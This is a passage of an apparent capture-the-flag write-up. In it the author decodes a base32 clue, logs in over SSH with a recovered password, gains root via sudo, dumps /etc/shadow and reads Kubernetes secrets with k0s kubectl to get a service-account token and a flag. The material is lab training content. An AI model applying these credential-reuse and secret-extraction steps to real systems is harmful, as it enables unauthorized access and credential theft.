@@ -1866,3 +1866,938 @@ grafana:x:472:0:hereiamatctf907:/home/grafana:/sbin/nologin
 ;rendering_viewport_max_height =
 ;rendering_viewport_max_device_scale_factor =
 ```
+```text
+# Change the listening host and port of the gRPC server. Default host is 127.0.0.1 and default port is 0 and will automatically assign
+```
+```text
+# a port not in use.
+;grpc_host =
+;grpc_port =
+
+[enterprise]
+```
+```text
+# Path to a valid Grafana Enterprise license.jwt file
+;license_path =
+
+[feature_toggles]
+```
+```text
+# enable features, separated by spaces
+;enable =
+
+[date_formats]
+```
+```text
+# For information on what formatting patterns that are supported https://momentjs.com/docs/#/displaying/
+```
+```text
+# Default system date format used in time range picker and other places where full time is displayed
+;full_date = YYYY-MM-DD HH:mm:ss
+```
+```text
+# Used by graph and other places where we only show small intervals
+;interval_second = HH:mm:ss
+;interval_minute = HH:mm
+;interval_hour = MM/DD HH:mm
+;interval_day = MM/DD
+;interval_month = YYYY-MM
+;interval_year = YYYY
+```
+```text
+# Experimental feature
+;use_browser_locale = false
+```
+```text
+# Default timezone for user preferences. Options are 'browser' for the browser local timezone or a timezone name from IANA Time Zone database, e.g. 'UTC' or 'Europe/Amsterdam' etc.
+;default_timezone = browser
+
+[expressions]
+```
+```text
+# Enable or disable the expressions functionality.
+;enabled = true
+
+[geomap]
+```
+```text
+# Set the JSON configuration for the default basemap
+;default_baselayer_config = `{
+;  "type": "xyz",
+;  "config": {
+;    "attribution": "Open street map",
+;    "url": "https://tile.openstreetmap.org/{z}/{x}/{y}.png"
+;  }
+;}`
+```
+```text
+# Enable or disable loading other base map layers
+;enable_custom_baselayers = true
+
+http://10.10.249.171:5000/
+Etch-A-Sketch (like game)
+
+view-source:http://10.10.249.171:5000/static/css/main.css
+/* @import url("https://pastebin.com/cPs69B0y"); */
+1.  OZQWO4TBNZ2A==== (base32) using cyberchef and give me a clue
+vagrant
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ echo OZQWO4TBNZ2A==== | base32 -d
+vagrant                                                                                                                                          
+
+http://10.10.249.171:6443/
+Client sent an HTTP request to an HTTPS server.
+```
+Find the username?
+*vagrant*
+Find the password?
+*hereiamatctf907*
+### Your Secret Crush
+If you want to keep a secret, you must also hide it from yourself. Find the secret!
+Answer the questions below
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh grafana@10.10.249.171           
+The authenticity of host '10.10.249.171 (10.10.249.171)' can't be established.
+ED25519 key fingerprint is SHA256:VPx7mYuBsJ55P9/hfFuuYIjMx9XjpMRWIy4wC5fiG4Y.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:15: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.249.171' (ED25519) to the list of known hosts.
+grafana@10.10.249.171's password: hereiamatctf907
+Permission denied, please try again.
+grafana@10.10.249.171's password:
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh vagrant@10.10.249.171
+vagrant@10.10.249.171's password: hereiamatctf907
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Jan  9 16:17:12 UTC 2023
+
+  System load:  0.26              Processes:              106
+  Usage of /:   6.5% of 61.80GB   Users logged in:        0
+  Memory usage: 57%               IP address for eth0:    10.10.249.171
+  Swap usage:   0%                IP address for docker0: 172.17.0.1
+
+248 packages can be updated.
+192 updates are security updates.
+
+Last login: Thu Feb 10 18:58:49 2022 from 10.0.2.2
+vagrant@johnny:~$ whoami
+vagrant
+
+vagrant@johnny:~$ sudo -l
+Matching Defaults entries for vagrant on johnny:
+    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User vagrant may run the following commands on johnny:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+vagrant@johnny:~$ sudo -s
+root@johnny:~# cd /
+root@johnny:/# ls
+bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  vagrant  vmlinuz
+boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  var      vmlinuz.old
+
+root@johnny:~/.ssh# cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbfyGA5t6yhBrLT92DNU6P8hv3MUfgTL4l33rbMAGf7/Z4EY2JtPCtctzxKvE4OBRSM2PCZ59N82w6KqBrYTpVBxbIJ3VDDQzZ9JtLiEb/8NFxXstZfsb1MCTq7o44U7/K1wG+QPCXmQX2AxEKIk7eHz6q1NPDbCTZkfKeOk7FKkSY4TlSjzfZg09Obv+DpPB800UDgeS1yW3hE0HKZJnPHIivOd7ScvxRJyFREa5o88MQ/4DS7q/kNqzuGDk180/Kf80bYBSjful5JNuTlz40b5mMIH8W7SHDcUrF6JRuRL/RuZ7tcTizjFRwIab/JtlqYHr2ktQfjJcd0NA9BeON vagrant
+
+root@johnny:~/.ssh# cat /etc/shadow
+root:!:18123:0:99999:7:::
+daemon:*:18113:0:99999:7:::
+bin:*:18113:0:99999:7:::
+sys:*:18113:0:99999:7:::
+sync:*:18113:0:99999:7:::
+games:*:18113:0:99999:7:::
+man:*:18113:0:99999:7:::
+lp:*:18113:0:99999:7:::
+mail:*:18113:0:99999:7:::
+news:*:18113:0:99999:7:::
+uucp:*:18113:0:99999:7:::
+proxy:*:18113:0:99999:7:::
+www-data:*:18113:0:99999:7:::
+backup:*:18113:0:99999:7:::
+list:*:18113:0:99999:7:::
+irc:*:18113:0:99999:7:::
+gnats:*:18113:0:99999:7:::
+nobody:*:18113:0:99999:7:::
+systemd-network:*:18113:0:99999:7:::
+systemd-resolve:*:18113:0:99999:7:::
+syslog:*:18113:0:99999:7:::
+messagebus:*:18113:0:99999:7:::
+_apt:*:18113:0:99999:7:::
+lxd:*:18123:0:99999:7:::
+uuidd:*:18123:0:99999:7:::
+dnsmasq:*:18123:0:99999:7:::
+landscape:*:18123:0:99999:7:::
+pollinate:*:18123:0:99999:7:::
+statd:*:18123:0:99999:7:::
+sshd:*:18123:0:99999:7:::
+vagrant:$6$lSFsvbrB$UiOHTM.XaC9ZC7kCYQKbyV/x8flLycuK26UtQCdy.RZedMASXDQai6l083QArvILrx4FEm3H1WspEveIOKL.m1:19033:0:99999:7:::
+vboxadd:!:18123::::::
+etcd:!:19033::::::
+kube-apiserver:!:19033::::::
+konnectivity-server:!:19033::::::
+kube-scheduler:!:19033::::::
+
+https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting/kubernetes-basics
+
+root@johnny:~/.ssh# ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.1  0.7 159824  7952 ?        Ss   15:38   0:03 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    15:38   0:00 [kthreadd]
+root         4  0.0  0.0      0     0 ?        I<   15:38   0:00 [kworker/0:0H]
+root         6  0.0  0.0      0     0 ?        I<   15:38   0:00 [mm_percpu_wq]
+root         7  0.2  0.0      0     0 ?        S    15:38   0:05 [ksoftirqd/0]
+root         8  0.0  0.0      0     0 ?        I    15:38   0:01 [rcu_sched]
+root         9  0.0  0.0      0     0 ?        I    15:38   0:00 [rcu_bh]
+root        10  0.0  0.0      0     0 ?        S    15:38   0:00 [migration/0]
+root        11  0.0  0.0      0     0 ?        S    15:38   0:00 [watchdog/0]
+root        12  0.0  0.0      0     0 ?        S    15:38   0:00 [cpuhp/0]
+root        13  0.0  0.0      0     0 ?        S    15:38   0:00 [kdevtmpfs]
+root        14  0.0  0.0      0     0 ?        I<   15:38   0:00 [netns]
+root        15  0.0  0.0      0     0 ?        S    15:38   0:00 [rcu_tasks_kthre]
+root        16  0.0  0.0      0     0 ?        S    15:38   0:00 [kauditd]
+root        17  0.0  0.0      0     0 ?        S    15:38   0:00 [xenbus]
+root        18  0.0  0.0      0     0 ?        S    15:38   0:00 [xenwatch]
+root        19  0.0  0.0      0     0 ?        I    15:38   0:00 [kworker/0:1]
+root        20  0.0  0.0      0     0 ?        S    15:38   0:00 [khungtaskd]
+root        21  0.0  0.0      0     0 ?        S    15:38   0:00 [oom_reaper]
+root        22  0.0  0.0      0     0 ?        I<   15:38   0:00 [writeback]
+root        23  0.0  0.0      0     0 ?        S    15:38   0:00 [kcompactd0]
+root        24  0.0  0.0      0     0 ?        SN   15:38   0:00 [ksmd]
+root        25  0.0  0.0      0     0 ?        SN   15:38   0:00 [khugepaged]
+root        26  0.0  0.0      0     0 ?        I<   15:38   0:00 [crypto]
+root        27  0.0  0.0      0     0 ?        I<   15:38   0:00 [kintegrityd]
+root        28  0.0  0.0      0     0 ?        I<   15:38   0:00 [kblockd]
+root        29  0.0  0.0      0     0 ?        I<   15:38   0:00 [ata_sff]
+root        30  0.0  0.0      0     0 ?        I<   15:38   0:00 [md]
+root        31  0.0  0.0      0     0 ?        I<   15:38   0:00 [edac-poller]
+root        32  0.0  0.0      0     0 ?        I<   15:38   0:00 [devfreq_wq]
+root        33  0.0  0.0      0     0 ?        I<   15:38   0:00 [watchdogd]
+root        36  0.0  0.0      0     0 ?        S    15:38   0:00 [kswapd0]
+root        37  0.0  0.0      0     0 ?        I<   15:38   0:00 [kworker/u31:0]
+root        38  0.0  0.0      0     0 ?        S    15:38   0:00 [ecryptfs-kthrea]
+root        80  0.0  0.0      0     0 ?        I<   15:38   0:00 [kthrotld]
+root        81  0.0  0.0      0     0 ?        I<   15:38   0:00 [acpi_thermal_pm]
+root        82  0.0  0.0      0     0 ?        S    15:38   0:00 [scsi_eh_0]
+root        83  0.0  0.0      0     0 ?        I<   15:38   0:00 [scsi_tmf_0]
+root        84  0.0  0.0      0     0 ?        S    15:38   0:00 [scsi_eh_1]
+root        85  0.0  0.0      0     0 ?        I<   15:38   0:00 [scsi_tmf_1]
+root        91  0.0  0.0      0     0 ?        I<   15:38   0:00 [ipv6_addrconf]
+root       100  0.0  0.0      0     0 ?        I<   15:38   0:00 [kstrp]
+root       117  0.0  0.0      0     0 ?        I<   15:38   0:00 [kworker/0:1H]
+root       118  0.0  0.0      0     0 ?        I<   15:38   0:00 [charger_manager]
+root       169  0.0  0.0      0     0 ?        I    15:38   0:00 [kworker/0:2]
+root       188  0.0  0.0      0     0 ?        I<   15:38   0:00 [ttm_swap]
+root       271  0.0  0.0      0     0 ?        I<   15:38   0:00 [raid5wq]
+root       295  0.0  0.0      0     0 ?        I<   15:38   0:00 [kdmflush]
+root       296  0.0  0.0      0     0 ?        I<   15:38   0:00 [bioset]
+root       304  0.0  0.0      0     0 ?        I<   15:38   0:00 [kdmflush]
+root       305  0.0  0.0      0     0 ?        I<   15:38   0:00 [bioset]
+root       351  0.0  0.0      0     0 ?        S    15:38   0:00 [jbd2/dm-0-8]
+root       352  0.0  0.0      0     0 ?        I<   15:38   0:00 [ext4-rsv-conver]
+root       408  0.2  1.0 111248 10664 ?        S<s  15:38   0:05 /lib/systemd/systemd-journald
+root       414  0.0  0.0      0     0 ?        I<   15:38   0:00 [iscsi_eh]
+root       421  0.0  0.0      0     0 ?        I<   15:38   0:00 [rpciod]
+root       422  0.0  0.0      0     0 ?        I<   15:38   0:00 [xprtiod]
+root       423  0.0  0.1 105904  1504 ?        Ss   15:38   0:00 /sbin/lvmetad -f
+root       425  0.0  0.0      0     0 ?        I<   15:38   0:00 [ib-comp-wq]
+root       426  0.0  0.0      0     0 ?        I<   15:38   0:00 [ib_mcast]
+root       427  0.0  0.0      0     0 ?        I<   15:38   0:00 [ib_nl_sa_wq]
+root       428  0.1  0.4  46240  4620 ?        Ss   15:38   0:04 /lib/systemd/systemd-udevd
+root       429  0.0  0.0      0     0 ?        I<   15:38   0:00 [rdma_cm]
+systemd+   468  0.0  0.4  80168  4812 ?        Ss   15:38   0:00 /lib/systemd/systemd-networkd
+root       501  0.0  0.3  47728  3280 ?        Ss   15:38   0:00 /sbin/rpcbind -f -w
+systemd+   512  0.0  0.4  70628  4316 ?        Ss   15:38   0:00 /lib/systemd/systemd-resolved
+root       623  0.0  1.2 170440 12204 ?        Ssl  15:39   0:01 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+message+   625  0.0  0.3  50100  3476 ?        Ss   15:39   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --s
+daemon     634  0.0  0.2  28332  2156 ?        Ss   15:39   0:00 /usr/sbin/atd -f
+syslog     636  0.0  0.3 267272  3636 ?        Ssl  15:39   0:01 /usr/sbin/rsyslogd -n
+root       637  0.0  0.5  70604  5476 ?        Ss   15:39   0:00 /lib/systemd/systemd-logind
+root       640  0.0  0.7 1232940 7060 ?        Ssl  15:39   0:00 /usr/bin/amazon-ssm-agent
+root       641  2.2  3.1 787916 31760 ?        Ssl  15:39   0:56 /usr/local/bin/k0s controller --single=true
+root       642  0.0  0.4 287536  5004 ?        Ssl  15:39   0:00 /usr/lib/accountsservice/accounts-daemon
+root       644  0.0  0.2  31320  2852 ?        Ss   15:39   0:00 /usr/sbin/cron -f
+root       646  0.0  0.1  95540  1560 ?        Ssl  15:39   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
+root       653  0.0  0.2  15956  2048 ttyS0    Ss+  15:39   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
+root       671  0.0  0.1  16180  1588 tty1     Ss+  15:39   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root       686  0.0  1.8 1359208 18884 ?       Ssl  15:39   0:01 /usr/bin/containerd
+root       687  0.0  0.4 291452  4996 ?        Ssl  15:39   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root       691  0.0  0.5  72296  5228 ?        Ss   15:39   0:00 /usr/sbin/sshd -D
+root       734  0.0  1.3 1170504 13432 ?       Sl   15:39   0:00 /usr/bin/ssm-agent-worker
+root       765  0.1  3.2 1447128 32680 ?       Ssl  15:39   0:03 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+root      1052  0.0  0.3 1005440 3724 ?        Sl   15:39   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -contai
+root      1061  0.0  0.3 1152904 3936 ?        Sl   15:39   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 5000 -container-i
+root      1075  0.0  0.3 1152904 3932 ?        Sl   15:39   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -contai
+root      1080  0.0  0.3 1005440 3216 ?        Sl   15:39   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-i
+root      1103  0.0  0.5 711444  5256 ?        Sl   15:39   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 54c2fca370f68b4fdb5d
+root      1116  0.0  0.4 711444  4756 ?        Sl   15:39   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id e7c06a854957fdc4f49e
+vagrant   1147  0.1  1.3  28532 13324 pts/0    Ss+  15:39   0:04 python3 main.py
+472       1162  0.2  3.7 786304 38256 pts/0    Ssl+ 15:39   0:07 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafan
+kube-ap+  1228  1.7  2.9 729504 30188 ?        Sl   15:40   0:42 /var/lib/k0s/bin/kine --endpoint=sqlite:///var/lib/k0s/db/state.db?more=r
+kube-ap+  1260 14.8 21.0 986892 211768 ?       Sl   15:40   6:06 /var/lib/k0s/bin/kube-apiserver --requestheader-allowed-names=front-proxy
+vagrant   1291 12.5  2.1  29820 21268 pts/0    Sl+  15:40   5:09 /usr/local/bin/python3 /home/pyuser/main.py
+kube-sc+  1336  0.1  2.3 753784 23348 ?        Sl   15:40   0:04 /var/lib/k0s/bin/kube-scheduler --leader-elect=false --profiling=false --
+kube-ap+  1337  3.8  6.5 768064 65504 ?        Sl   15:40   1:33 /var/lib/k0s/bin/kube-controller-manager --cluster-signing-key-file=/var/
+root      1517  0.0  0.0      0     0 ?        I    16:04   0:00 [kworker/u30:0]
+root      1525  0.0  0.0      0     0 ?        I    16:09   0:00 [kworker/u30:2]
+root      1534  0.0  0.0      0     0 ?        I    16:15   0:00 [kworker/u30:1]
+root      1548  0.0  0.7 107984  7132 ?        Ss   16:17   0:00 sshd: vagrant [priv]
+vagrant   1552  0.0  0.7  76776  7184 ?        Ss   16:17   0:00 /lib/systemd/systemd --user
+vagrant   1554  0.0  0.1 193808  1832 ?        S    16:17   0:00 (sd-pam)
+vagrant   1673  0.0  0.3 107984  3364 ?        S    16:17   0:00 sshd: vagrant@pts/0
+vagrant   1674  0.0  0.3  21472  3520 pts/0    Ss   16:17   0:00 -bash
+root      1694  0.0  0.4  67844  4364 pts/0    S    16:18   0:00 sudo -s
+root      1696  0.0  0.3  21472  3840 pts/0    S    16:18   0:00 /bin/bash
+
+https://k0sproject.io/
+
+https://docs.k0sproject.io/v1.25.4+k0s.0/
+
+https://github.com/k0sproject/k0s
+
+kubectl controls the Kubernetes cluster manager.
+
+ Find more information at: https://kubernetes.io/docs/reference/kubectl/overview/
+
+Aliases:
+kubectl, kc
+
+Basic Commands (Beginner):
+  create        Create a resource from a file or from stdin
+  expose        Take a replication controller, service, deployment or pod and expose it as a new Kubernetes service
+  run           Run a particular image on the cluster
+  set           Set specific features on objects
+
+Basic Commands (Intermediate):
+  explain       Get documentation for a resource
+  get           Display one or many resources
+  edit          Edit a resource on the server
+  delete        Delete resources by file names, stdin, resources and names, or by resources and label selector
+
+Deploy Commands:
+  rollout       Manage the rollout of a resource
+  scale         Set a new size for a deployment, replica set, or replication controller
+  autoscale     Auto-scale a deployment, replica set, stateful set, or replication controller
+
+Cluster Management Commands:
+  certificate   Modify certificate resources.
+  cluster-info  Display cluster information
+  top           Display resource (CPU/memory) usage
+  cordon        Mark node as unschedulable
+  uncordon      Mark node as schedulable
+  drain         Drain node in preparation for maintenance
+  taint         Update the taints on one or more nodes
+
+Troubleshooting and Debugging Commands:
+  describe      Show details of a specific resource or group of resources
+  logs          Print the logs for a container in a pod
+  attach        Attach to a running container
+  exec          Execute a command in a container
+  port-forward  Forward one or more local ports to a pod
+  proxy         Run a proxy to the Kubernetes API server
+  cp            Copy files and directories to and from containers
+  auth          Inspect authorization
+  debug         Create debugging sessions for troubleshooting workloads and nodes
+
+Advanced Commands:
+  diff          Diff the live version against a would-be applied version
+  apply         Apply a configuration to a resource by file name or stdin
+  patch         Update fields of a resource
+  replace       Replace a resource by file name or stdin
+  wait          Experimental: Wait for a specific condition on one or many resources
+  kustomize     Build a kustomization target from a directory or URL.
+
+Settings Commands:
+  label         Update the labels on a resource
+  annotate      Update the annotations on a resource
+  completion    Output shell completion code for the specified shell (bash, zsh or fish)
+
+Other Commands:
+  alpha         Commands for features in alpha
+  api-resources Print the supported API resources on the server
+  api-versions  Print the supported API versions on the server, in the form of "group/version"
+  config        Modify kubeconfig files
+  plugin        Provides utilities for interacting with plugins
+  version       Print the client and server version information
+
+Usage:
+  k0s kubectl [flags] [options]
+
+Use "k0s kubectl <command> --help" for more information about a given command.
+Use "k0s kubectl options" for a list of global command-line options (applies to all commands).
+
+root@johnny:~/.ssh# k0s kubectl get secret
+NAME                  TYPE                                  DATA   AGE
+default-token-nhwb5   kubernetes.io/service-account-token   3      332d
+k8s.authentication    Opaque                                1      332d
+
+root@johnny:~/.ssh# k0s kubectl edit secret default-token-nhwb5
+```
+```text
+# Please edit the object below. Lines beginning with a '#' will be ignored,
+```
+```text
+# and an empty file will abort the edit. If an error occurs while saving this file will be
+```
+```text
+# reopened with the relevant failures.
+#
+
+apiVersion: v1
+data:
+  ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURBRENDQWVpZ0F3SUJBZ0lVY0tubW5LZ0NPQjVqKzVKWHpMajIxeHYvZlBjd0RRWUpLb1pJaHZjTkFRRUwKQlFBd0dERVdNQlFHQTFVRUF4TU5hM1ZpWlhKdVpYUmxjeTFqWVRBZUZ3MHlNakF5TVRBeE9EVXdNREJhRncwegpNakF5TURneE9EVXdNREJhTUJneEZqQVVCZ05WQkFNVERXdDFZbVZ5Ym1WMFpYTXRZMkV3Z2dFaU1BMEdDU3FHClNJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUUN1ZGd5dTdoQUE1RkVrRFpJQ2s3Z3NYbkVBeHdOMzQ2Nk8KNDN6dFovVnAvSVJFYnJTc1dRbWQ4Tk1qV3hlZUwxbkxtV1FBSkdMOWswQ0psdFhvbWVHVk04eEs5L0tjUWxlMAoyeko4bHpWV2dWcHdnb3E5MnJjUXhXOVBnZENFd3lRdC9hUVIzVHdwSzlOeDRrcHMzSkZYK1dyYUxPUkxNWlorCnVpL2Z4UHBHeStTa1NUWEkySmN5MS9iN05DOGhHc010QTQ2TDhMenQ2QkRRVzNTVC9FbmtPdGdPai9MMjdkY3IKTmc3UlhpVThhdk0ydzlDS0pQbnp1b1k0dDdXZnRZeG1mWHFWRmdBaDRrWW9ONzJ1V2RsU1hOVnF0SkpSdkhDdgo2ZlpZbWFJK295bWtUaisrQVFHSGxjSGFnTE1VWXlvQVdVYXhxTTl2dE9HTVRpbGdjMWFqQWdNQkFBR2pRakJBCk1BNEdBMVVkRHdFQi93UUVBd0lCQmpBUEJnTlZIUk1CQWY4RUJUQURBUUgvTUIwR0ExVWREZ1FXQkJSUVpWcloKeENxVVRkME1KbHVkY0duSC9xS0xNREFOQmdrcWhraUc5dzBCQVFzRkFBT0NBUUVBaFdTTnRpMDEvMUVIZDVLbApnQ1llbDJpV29ielRXVmVsdzNMcXNYOEVuZ1RFYmlqUDJEVGF2RWpHV1ZzTzB1WWt2THp1dTdtT2Z3WDJDTFJ1CmY5Y3hScmRxeTRuSExxRkpkUVFwMjlMVmF1VXhoUHFNcjgxeVYxT1NYUzdmdFpNYngwZHBaSktaUnV1QzFhNUUKeE9lMkNXbU84QTJtVjhZcWU1eXRHNExzUko5ZWp5aEd4T21aNjZMVzBwck9zTnRhb2RUQnZlZkxYVFRlaXg1agpJZHhkaHVjaHYyeTFUa2pnSzZyNGZ3aTkrOWxtUTdnMEVEMFZEMkNMUWNnSFBwZ3BaYk51MTk1VHZFa3R4TWZ2CjlCbW81cEpXU0I5QTgzTFk0OVQ4U2VNMlQwdTk3dXpGNW83Z2lsbERGeGRvbFF3NGlRRmNLRytTUzI5d2QvYVIKcVhPeWhRPT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=
+  namespace: ZGVmYXVsdA== (default)
+  token: ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqbG9hblp3WkVoMmExcFJUbFkxVGsxdVNIbzNSbkpuYUV0MWFsRTJhMk5DTkdvd09XdE5iMGt0U0UwaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUprWldaaGRXeDBJaXdpYTNWaVpYSnVaWFJsY3k1cGJ5OXpaWEoyYVdObFlXTmpiM1Z1ZEM5elpXTnlaWFF1Ym1GdFpTSTZJbVJsWm1GMWJIUXRkRzlyWlc0dGJtaDNZalVpTENKcmRXSmxjbTVsZEdWekxtbHZMM05sY25acFkyVmhZMk52ZFc1MEwzTmxjblpwWTJVdFlXTmpiM1Z1ZEM1dVlXMWxJam9pWkdWbVlYVnNkQ0lzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJakV3WkRReU56RXlMV0pqTnpVdE5EbG1PQzFpTWpNMkxUTmtNakZpTURRd05HWTRZaUlzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwa1pXWmhkV3gwT21SbFptRjFiSFFpZlEualFnNmstSk42S3dRYndDbEI3SENvR0ZCeFV5NFpWMUNZYnIxNXVRN202ck8wZWRqQ3RGQXpwdW1kWFBPMnFPR0s1b0JITmxoUFJ0cDZMSTZUZFVsWVp5TXNOaGZ1ZWNaaXFBRlB2bm5ReFhEckNnLVNKUFQ2WkJORUFNcTZhOUlSTHhfcHBlRlNOY2pVTUdFMzVibnBDYVNGMzFObHpUenN3RURIeGszcnFyVy1XWmtWTmh5Vnl4RGE4Z3VsaWxmd3ppa3RVa25iYnM3end6M0k2dmpTd0xfOXBlMV9Sa0xjUkFlamFyRl9qeVV3Z1ZsZWhkQnJ6WkFEdzE1OEFxTHI1STYxejBiM08xRVgwNTF3dm1VS3FDMldMdVkxS19qcXNCM2thYTlnVVl3REs0V0J5eUNuV3BYOFNFTzRpUGw5UEJRTlF5RGFnalVmY0ZMV01TUk13
+kind: Secret
+metadata:
+  annotations:
+    kubernetes.io/service-account.name: default
+    kubernetes.io/service-account.uid: 10d42712-bc75-49f8-b236-3d21b0404f8b
+  creationTimestamp: "2022-02-10T18:56:17Z"
+  name: default-token-nhwb5
+  namespace: default
+  resourceVersion: "383"
+  uid: a74c755b-2dc5-402b-9baf-155f7b3bc9cc
+type: kubernetes.io/service-account-token
+
+:qa!
+
+root@johnny:~/.ssh# k0s kubectl edit secret k8s.authentication
+```
+```text
+# Please edit the object below. Lines beginning with a '#' will be ignored,
+```
+```text
+# and an empty file will abort the edit. If an error occurs while saving this file will be
+```
+```text
+# reopened with the relevant failures.
+#
+apiVersion: v1
+data:
+  id: VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9
+kind: Secret
+metadata:
+  creationTimestamp: "2022-02-10T18:58:02Z"
+  name: k8s.authentication
+  namespace: default
+  resourceVersion: "515"
+  uid: 416e4783-03a8-4f92-8e91-8cbc491bf727
+type: Opaque
+
+:qa! (to exit)
+
+Edit cancelled, no changes made.
+
+VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9 (from base64)
+
+THM{yes_there_$s_no_$ecret}
+```
+```text
+┌──(kali㉿kali)-[/etc]
+└─$ echo VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9 | base64 -d
+THM{yes_there_$s_no_$ecret}
+```
+What secret did you find?
+### Game of Pods
+_Pods_ are the smallest deployable units of computing that you can create and manage in Kubernetes.
+A _Pod_ (as in a pod of whales or pea pod) is a group of one or more [containers](https://kubernetes.io/docs/concepts/containers/), with shared storage and network resources, and a specification for how to run the containers. Find the Pod flag!
+Answer the questions below
+```text
+https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting/attacking-kubernetes-from-inside-a-pod?q=%2Fvar%2Flib
+
+root@johnny:~/.ssh# k0s kubectl get pods --help
+Display one or many resources.
+
+ Prints a table of the most important information about the specified resources. You can filter the list using a label
+selector and the --selector flag. If the desired resource type is namespaced you will only see results in your current
+namespace unless you pass --all-namespaces.
+
+ By specifying the output as 'template' and providing a Go template as the value of the --template flag, you can filter
+the attributes of the fetched resources.
+
+Use "kubectl api-resources" for a complete list of supported resources.
+
+Examples:
+```
+```text
+# List all pods in ps output format
+  kubectl get pods
+```
+```text
+# List all pods in ps output format with more information (such as node name)
+  kubectl get pods -o wide
+```
+```text
+# List a single replication controller with specified NAME in ps output format
+  kubectl get replicationcontroller web
+```
+```text
+# List deployments in JSON output format, in the "v1" version of the "apps" API group
+  kubectl get deployments.v1.apps -o json
+```
+```text
+# List a single pod in JSON output format
+  kubectl get -o json pod web-pod-13je7
+```
+```text
+# List a pod identified by type and name specified in "pod.yaml" in JSON output format
+  kubectl get -f pod.yaml -o json
+```
+```text
+# List resources from a directory with kustomization.yaml - e.g. dir/kustomization.yaml
+  kubectl get -k dir/
+```
+```text
+# Return only the phase value of the specified pod
+  kubectl get -o template pod/web-pod-13je7 --template={{.status.phase}}
+```
+```text
+# List resource information in custom columns
+  kubectl get pod test-pod -o custom-columns=CONTAINER:.spec.containers[0].name,IMAGE:.spec.containers[0].image
+```
+```text
+# List all replication controllers and services together in ps output format
+  kubectl get rc,services
+```
+```text
+# List one or more resources by their type and names
+  kubectl get rc/web service/frontend pods/web-pod-13je7
+
+Options:
+  -A, --all-namespaces=false: If present, list the requested object(s) across all namespaces. Namespace in current
+context is ignored even if specified with --namespace.
+      --allow-missing-template-keys=true: If true, ignore any errors in templates when a field or map key is missing in
+the template. Only applies to golang and jsonpath output formats.
+      --chunk-size=500: Return large lists in chunks rather than all at once. Pass 0 to disable. This flag is beta and
+may change in the future.
+      --field-selector='': Selector (field query) to filter on, supports '=', '==', and '!='.(e.g. --field-selector
+key1=value1,key2=value2). The server only supports a limited number of field queries per type.
+  -f, --filename=[]: Filename, directory, or URL to files identifying the resource to get from a server.
+      --ignore-not-found=false: If the requested object does not exist the command will return exit code 0.
+  -k, --kustomize='': Process the kustomization directory. This flag can't be used together with -f or -R.
+  -L, --label-columns=[]: Accepts a comma separated list of labels that are going to be presented as columns. Names are
+case-sensitive. You can also use multiple flag options like -L label1 -L label2...
+      --no-headers=false: When using the default or custom-column output format, don't print headers (default print
+headers).
+  -o, --output='': Output format. One of:
+json|yaml|name|go-template|go-template-file|template|templatefile|jsonpath|jsonpath-as-json|jsonpath-file|custom-columns-file|custom-columns|wide
+See custom columns [https://kubernetes.io/docs/reference/kubectl/overview/#custom-columns], golang template
+[http://golang.org/pkg/text/template/#pkg-overview] and jsonpath template
+[https://kubernetes.io/docs/reference/kubectl/jsonpath/].
+      --output-watch-events=false: Output watch event objects when --watch or --watch-only is used. Existing objects are
